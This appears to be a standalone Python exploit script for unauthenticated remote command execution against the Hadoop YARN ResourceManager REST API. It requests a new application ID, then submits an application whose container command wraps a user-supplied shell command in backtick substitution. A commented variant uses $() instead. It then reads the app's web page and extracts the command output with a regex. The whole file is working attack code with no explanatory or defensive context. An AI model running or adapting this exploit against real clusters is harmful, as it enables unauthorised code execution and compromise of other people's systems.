import requests
import time
import re
import sys

target = 'http://cqq.com'

url = target + '/ws/v1/cluster/apps/new-application'
resp = requests.post(url, proxies={'http': 'http://192.168.85.1:8087'})
#print(resp.text)

app_id = resp.json()['application-id']
url2 = target + '/ws/v1/cluster/apps'

cmd = sys.argv[1]

data = {
    'application-id': app_id,
    'application-name': 'test_by_111',
    'am-container-spec': {
        'commands': {
            'command': ' `{0}`'.format(cmd),
            #'command': '$({0})'.format(cmd),
        },
    },
    'application-type': 'YARN',
}

resp2 = requests.post(url2, json=data, proxies={'http': 'http://192.168.85.1:8087'}, allow_redirects=True)

time.sleep(6)


url3 = target + '/cluster/app/' + app_id
#url3 = sys.argv[1]

resp3 = requests.get(url3)

#print(resp3.text)

findword="Exit code:([\s\S]*)at org.apache.hadoop.util.Shell.runCommand"
pattern = re.compile(findword) 
results =  pattern.findall(resp3.text)
for result in results:
    print(result.replace('command not found\\n/bin/bash:', '').replace('command not found\\n', ''))



print(url3)
